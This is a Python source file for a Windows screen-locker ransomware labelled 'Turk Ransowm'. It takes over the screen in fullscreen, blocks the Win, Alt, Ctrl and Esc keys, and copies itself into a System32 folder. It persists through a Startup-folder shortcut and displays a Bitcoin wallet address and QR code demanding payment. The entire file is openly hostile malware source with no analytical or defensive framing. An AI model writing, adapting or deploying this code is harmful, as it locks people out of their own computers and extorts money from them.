from customtkinter import *
from PIL import Image
from qrcode import QRCode,constants
from keyboard import block_key
from shutil import move,copy
from os import path,makedirs
import winshell
from win32com.client import Dispatch
class Window(CTk):
    def __init__(self):
        super().__init__()
        self.configure(background="#F0F0F0")
        self.focus_force()
        self.wm_attributes('-fullscreen', True)
        self.attributes("-topmost", True)
        self.protocol("WM_DELETE_WINDOW","on_closing")
        self.resizable(False,False)
        self.after(0, lambda:self.state('zoomed'))
        self.focus_force()
        block_key('Win')
        block_key('Alt')
        block_key('Ctrl')
        block_key('Esc')
        self.bind("<Delete>", self.secret_key)
        self.background_image = Image.open("Turk.jpg")
        self.bg_image = CTkImage(self.background_image, size=(1920, 1080))
        self.bg_label = CTkLabel(self, image=self.bg_image, text="")
        target = os.path.join(os.getcwd(),"Turk Ransowm.exe")
        # target = os.path.join(os.getcwd(),"Turk Ransowm.py")
        target2 = os.path.join(os.getcwd(),"Turk.jpg")
        shortcut = "lol.lnk"
        icon = os.path.join(os.getcwd(),"MT.ico")
        source_file = "lol.lnk"
        destination_dir = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
        main_dir = r"C:\Windows\System32\Turk"
        target_after = os.path.join(main_dir,"Turk Ransowm.exe")
        # target_after = os.path.join(main_dir,"Turk Ransowm.py")
        icon_after = os.path.join(main_dir,"MT.ico")
        makedirs(destination_dir, exist_ok=True)
        file_path = path.join(destination_dir, source_file)
        try:
            if path.isfile(file_path):
                pass
            else:
                makedirs(main_dir, exist_ok=True)
                copy(target,target_after)
                copy(icon,main_dir)
                copy(target2,main_dir)
                self.create_shortcut(target_after, shortcut, icon_after)
                move(source_file, destination_dir)
        except Exception as e:
            pass
        data = "bc1q8hy498wxl2j46yf6ng73lndey9zpdlyq2tqnta?message=Wah"
        qr = QRCode(
            version=1,
            error_correction=constants.ERROR_CORRECT_H,
            box_size=5,
            border=1,
        )
        qr.add_data(data)
        qr.make(fit=True)
        qr_img = qr.make_image(fill_color="white", back_color="black")
        qr_img = qr_img.resize((250, 250))
        qr_tk = CTkImage(qr_img,size=(200, 200))
        qr_label = CTkLabel(
            self,
            text="",
            image=qr_tk,
            )
        self.qize = CTkLabel(
            self,
            text="BTC Wallet:",
            bg_color="black",
            font=("Arial", 25),
            )
        self.bg_label.place(relwidth=1, relheight=1)
        qr_label.place(relx=0.9, rely=0.8, anchor="center")
        self.qize.place(relx=0.88, rely=0.66, anchor="center")
    def secret_key(self,event):
        self.destroy()
        quit()
    def create_shortcut(self,target_path, shortcut_path, icon_path=None):
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.WorkingDirectory = os.path.dirname(target_path)
        if icon_path:
            shortcut.IconLocation = icon_path
        shortcut.save()


if __name__ == "__main__":
    app = Window()
    app.mainloop()